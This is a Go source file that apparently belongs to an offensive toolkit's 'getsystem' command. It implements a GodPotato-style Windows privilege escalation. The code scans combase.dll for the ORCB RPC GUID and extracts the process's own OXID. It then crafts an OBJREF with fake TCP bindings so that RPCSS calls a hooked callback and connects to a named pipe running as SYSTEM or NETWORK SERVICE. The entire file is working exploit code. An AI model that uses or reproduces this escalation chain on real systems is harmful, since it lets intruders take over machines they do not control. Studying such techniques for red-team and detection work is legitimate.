//go:build windows
// +build windows

// getsystem_potato_oxid.go contains OXID extraction, module scanning, GUID pattern
// matching, COM object creation, OBJREF crafting, and OXID resolution triggering.

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func findModuleInfo(moduleName string) (uintptr, uintptr, error) {
	namePtr, err := windows.UTF16PtrFromString(moduleName)
	if err != nil {
		return 0, 0, err
	}

	handle, _, callErr := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
	if handle == 0 {
		return 0, 0, fmt.Errorf("module %s not found: %v", moduleName, callErr)
	}

	// Query memory region to get the full module size
	type memoryBasicInformation struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionID       uint16
		_                 uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	var mbi memoryBasicInformation
	ret, _, _ := procVirtualQuery.Call(handle, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
	if ret == 0 {
		return handle, 0x1000000, nil // Default 16MB scan range
	}

	// Walk regions to find total module size
	totalSize := mbi.RegionSize
	addr := handle + mbi.RegionSize
	for {
		ret, _, _ = procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
		if ret == 0 || mbi.AllocationBase != handle {
			break
		}
		totalSize += mbi.RegionSize
		addr += mbi.RegionSize
	}

	return handle, totalSize, nil
}

// scanForGUID scans module memory for the ORCB RPC interface GUID.
// Returns the address of the RPC_SERVER_INTERFACE structure that contains this GUID.
func scanForGUID(base, size uintptr, pattern []byte) (uintptr, error) {
	// The GUID appears at offset 4 in RPC_SERVER_INTERFACE (after the Length field)
	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), int(size))

	for i := 0; i <= len(mem)-len(pattern)-4; i++ {
		// Check at offset i+4 (GUID is after uint32 Length field)
		match := true
		for j := 0; j < len(pattern); j++ {
			if mem[i+4+j] != pattern[j] {
				match = false
				break
			}
		}
		if match {
			return base + uintptr(i), nil
		}
	}

	return 0, fmt.Errorf("ORCB GUID pattern not found in %d bytes of combase.dll", size)
}

// extractProcessOXID creates a COM object, marshals it via CreateObjrefMoniker,
// and parses the resulting OBJREF to extract our process's OXID, OID, and IPID.
// GodPotato requires the process's own OXID — a random OXID won't trigger
// the UseProtSeq callback because RPCSS won't find it in its OXID table.
func extractProcessOXID() (oxid [8]byte, oid [8]byte, ipid [16]byte, err error) {
	// Create a minimal IUnknown COM object
	iunknown := createMinimalIUnknown()
	if iunknown == 0 {
		err = fmt.Errorf("failed to create IUnknown object")
		return
	}

	// CreateObjrefMoniker(pUnknown, &pMoniker) → marshals the object
	var pMoniker uintptr
	ret, _, callErr := procCreateObjrefMonik.Call(iunknown, uintptr(unsafe.Pointer(&pMoniker)))
	if ret != 0 || pMoniker == 0 {
		err = fmt.Errorf("CreateObjrefMoniker: hr=0x%x %v", ret, callErr)
		return
	}
	defer comRelease(pMoniker)

	// CreateBindCtx(0, &pBindCtx)
	var pBindCtx uintptr
	ret, _, callErr = procCreateBindCtx.Call(0, uintptr(unsafe.Pointer(&pBindCtx)))
	if ret != 0 || pBindCtx == 0 {
		err = fmt.Errorf("CreateBindCtx: hr=0x%x %v", ret, callErr)
		return
	}
	defer comRelease(pBindCtx)

	// IMoniker::GetDisplayName(pBindCtx, NULL, &displayName)
	// GetDisplayName is at vtable index 20
	var pDisplayName uintptr
	monikerVtbl := *(*uintptr)(unsafe.Pointer(pMoniker))
	getDisplayNameFunc := *(*uintptr)(unsafe.Pointer(monikerVtbl + 20*unsafe.Sizeof(uintptr(0))))
	ret, _, callErr = syscall.SyscallN(getDisplayNameFunc, pMoniker, pBindCtx, 0, uintptr(unsafe.Pointer(&pDisplayName)))
	if ret != 0 || pDisplayName == 0 {
		err = fmt.Errorf("GetDisplayName: hr=0x%x %v", ret, callErr)
		return
	}
	defer procCoTaskMemFree.Call(pDisplayName)

	// Parse the display name: "objref:MEOW<base64>:"
	displayStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(pDisplayName)))

	// Strip "objref:" prefix and ":" suffix
	displayStr = strings.TrimPrefix(displayStr, "objref:")
	displayStr = strings.TrimSuffix(displayStr, ":")

	// Base64 decode to get raw OBJREF bytes
	objrefBytes, decErr := base64.StdEncoding.DecodeString(displayStr)
	if decErr != nil {
		// Try with padding
		for len(displayStr)%4 != 0 {
			displayStr += "="
		}
		objrefBytes, decErr = base64.StdEncoding.DecodeString(displayStr)
	}
	if decErr != nil {
		err = fmt.Errorf("decode OBJREF: %v (display=%s)", decErr, displayStr[:potatoMin(40, len(displayStr))])
		return
	}

	// Parse OBJREF structure to extract OXID, OID, IPID
	// OBJREF layout:
	//   offset 0:  Signature (4 bytes) = "MEOW"
	//   offset 4:  Flags (4 bytes) = OBJREF_STANDARD
	//   offset 8:  IID (16 bytes)
	//   offset 24: STDOBJREF.flags (4 bytes)
	//   offset 28: STDOBJREF.cPublicRefs (4 bytes)
	//   offset 32: STDOBJREF.oxid (8 bytes)
	//   offset 40: STDOBJREF.oid (8 bytes)
	//   offset 48: STDOBJREF.ipid (16 bytes)
	if len(objrefBytes) < 64 {
		err = fmt.Errorf("OBJREF too short: %d bytes", len(objrefBytes))
		return
	}

	copy(oxid[:], objrefBytes[32:40])
	copy(oid[:], objrefBytes[40:48])
	copy(ipid[:], objrefBytes[48:64])
	return
}

func potatoMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// createMinimalIUnknown creates a COM IUnknown object in Go that can be
// passed to CreateObjrefMoniker. The standard COM marshaler will use it
// to register an OXID with RPCSS.
func createMinimalIUnknown() uintptr {
	// Ensure callbacks stay alive (prevent GC)
	potatoGlobal.mu.Lock()
	defer potatoGlobal.mu.Unlock()

	// Build vtable with 3 IUnknown methods
	type iunknownVtbl struct {
		QueryInterface uintptr
		AddRef         uintptr
		Release        uintptr
	}

	vtbl := &iunknownVtbl{
		QueryInterface: syscall.NewCallback(func(this, riid, ppv uintptr) uintptr {
			if ppv == 0 {
				return 0x80004003 // E_POINTER
			}
			// Only succeed for IID_IUnknown — return E_NOINTERFACE for everything
			// else (especially IMarshal!) so COM uses standard OXID marshaling.
			// If we return S_OK for IMarshal, COM tries to call IMarshal methods
			// on our 3-entry IUnknown vtable, reading garbage and hanging.
			qiid := unsafe.Slice((*byte)(unsafe.Pointer(riid)), 16)
			isIUnknown := true
			for i := 0; i < 16; i++ {
				if qiid[i] != iidIUnknown[i] {
					isIUnknown = false
					break
				}
			}
			if isIUnknown {
				*(*uintptr)(unsafe.Pointer(ppv)) = this
				return 0 // S_OK
			}
			*(*uintptr)(unsafe.Pointer(ppv)) = 0
			return 0x80004002 // E_NOINTERFACE
		}),
		AddRef: syscall.NewCallback(func(this uintptr) uintptr {
			return 1
		}),
		Release: syscall.NewCallback(func(this uintptr) uintptr {
			return 0
		}),
	}

	// The COM object is just a pointer to its vtable pointer
	obj := &struct{ vtbl *iunknownVtbl }{vtbl: vtbl}

	// Store reference in potatoGlobal to prevent GC from collecting the object.
	// Without this, converting to uintptr removes the only Go reference, and
	// the GC could free the object while COM still holds a native pointer to it.
	potatoGlobal.iunknownRef = obj

	return uintptr(unsafe.Pointer(obj))
}

// comRelease calls IUnknown::Release on a COM interface pointer.
func comRelease(punk uintptr) {
	if punk == 0 {
		return
	}
	vtblPtr := *(*uintptr)(unsafe.Pointer(punk))
	releaseFunc := *(*uintptr)(unsafe.Pointer(vtblPtr + 2*unsafe.Sizeof(uintptr(0))))
	syscall.SyscallN(releaseFunc, punk)
}

// triggerOXIDResolution constructs a crafted OBJREF with TCP bindings using
// the process's own OXID, and calls CoUnmarshalInterface to trigger OXID
// resolution through the hooked UseProtSeq callback.
func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
	// Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
	objref := buildCraftedOBJREF(oxid, oid, ipid)

	// Create IStream wrapping our OBJREF
	stream, streamRelease, err := createOBJREFStream(objref)
	if err != nil {
		return fmt.Errorf("create IStream: %w", err)
	}
	defer streamRelease()

	// Call CoUnmarshalInterface to trigger OXID resolution.
	// This causes COM to contact RPCSS to resolve the OXID.
	// Since the DUALSTRINGARRAY specifies TCP (which we haven't registered),
	// RPCSS calls the ORCB UseProtSeq callback (which we hooked) to ask us
	// to register TCP. Our hook returns a pipe binding, and RPCSS connects
	// to our named pipe (SYSTEM on old Windows, NETWORK SERVICE on Win11+).
	var punk uintptr
	ret, _, _ := procCoUnmarshalIntf.Call(
		stream,
		uintptr(unsafe.Pointer(&iidIUnknown)),
		uintptr(unsafe.Pointer(&punk)),
	)

	if punk != 0 {
		comRelease(punk)
	}

	// CoUnmarshalInterface may return an error (the object's bindings are fake),
	// but the side effect of triggering OXID resolution is what we want.
	// Return the HRESULT for diagnostic purposes.
	if ret != 0 {
		return fmt.Errorf("CoUnmarshalInterface hr=0x%08x", ret)
	}
	return nil
}

// buildCraftedOBJREF constructs a standard OBJREF with the process's own
// OXID/OID/IPID but with TCP bindings to 127.0.0.1. This forces RPCSS
// to call UseProtSeq because the process hasn't registered TCP yet.
func buildCraftedOBJREF(oxid [8]byte, oid [8]byte, ipid [16]byte) []byte {
	buf := make([]byte, 0, 256)

	// Signature ("MEOW")
	sig := make([]byte, 4)
	binary.LittleEndian.PutUint32(sig, objrefSignature)
	buf = append(buf, sig...)

	// Flags (OBJREF_STANDARD)
	flags := make([]byte, 4)
	binary.LittleEndian.PutUint32(flags, objrefStandard)
	buf = append(buf, flags...)

	// IID (IID_IUnknown)
	buf = append(buf, iidIUnknown[:]...)

	// STDOBJREF.flags (4 bytes)
	stdobjFlags := make([]byte, 4)
	binary.LittleEndian.PutUint32(stdobjFlags, 0)
	buf = append(buf, stdobjFlags...)

	// STDOBJREF.cPublicRefs (4 bytes)
	pubRefs := make([]byte, 4)
	binary.LittleEndian.PutUint32(pubRefs, 1)
	buf = append(buf, pubRefs...)

	// STDOBJREF.oxid (8 bytes) — OUR process's OXID
	buf = append(buf, oxid[:]...)

	// STDOBJREF.oid (8 bytes) — OUR object's OID
	buf = append(buf, oid[:]...)

	// STDOBJREF.ipid (16 bytes) — OUR interface IPID
	buf = append(buf, ipid[:]...)

	// DUALSTRINGARRAY — TCP to 127.0.0.1 (forces UseProtSeq callback)
	dsArray := buildTCPDualStringArray()
	buf = append(buf, dsArray...)

	return buf
}

// buildTCPDualStringArray creates a DUALSTRINGARRAY pointing to 127.0.0.1
// via TCP (tower 0x07). Since our process only registered ALPC (local),
// the TCP binding forces RPCSS to call UseProtSeq to ask us to register TCP.
func buildTCPDualStringArray() []byte {
	towerID := uint16(0x0007) // ncacn_ip_tcp
	addr := utf16Encode("127.0.0.1")

	stringBinding := make([]byte, 0, 32)
	tb := make([]byte, 2)
	binary.LittleEndian.PutUint16(tb, towerID)
	stringBinding = append(stringBinding, tb...)
	for _, c := range addr {
		cb := make([]byte, 2)
		binary.LittleEndian.PutUint16(cb, c)
		stringBinding = append(stringBinding, cb...)
	}
	stringBinding = append(stringBinding, 0, 0) // null terminator
	stringBinding = append(stringBinding, 0, 0) // end of string bindings

	stringEntries := len(stringBinding) / 2

	// Security binding
	secBinding := []byte{0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00}
	secEntries := len(secBinding) / 2

	totalEntries := stringEntries + secEntries

	result := make([]byte, 4+totalEntries*2)
	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
	copy(result[4:], stringBinding)
	copy(result[4+stringEntries*2:], secBinding)

	return result
}

func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
	// Use SHCreateMemStream from shlwapi.dll
	shlwapiDLL := windows.NewLazySystemDLL("shlwapi.dll")
	procSHCreateMemStream := shlwapiDLL.NewProc("SHCreateMemStream")

	if procSHCreateMemStream.Find() == nil {
		stream, _, err := procSHCreateMemStream.Call(
			uintptr(unsafe.Pointer(&objrefData[0])),
			uintptr(len(objrefData)),
		)
		if stream == 0 {
			return 0, nil, fmt.Errorf("SHCreateMemStream: %v", err)
		}

		release := func() {
			comRelease(stream)
		}

		return stream, release, nil
	}

	return 0, nil, fmt.Errorf("SHCreateMemStream not available")
}
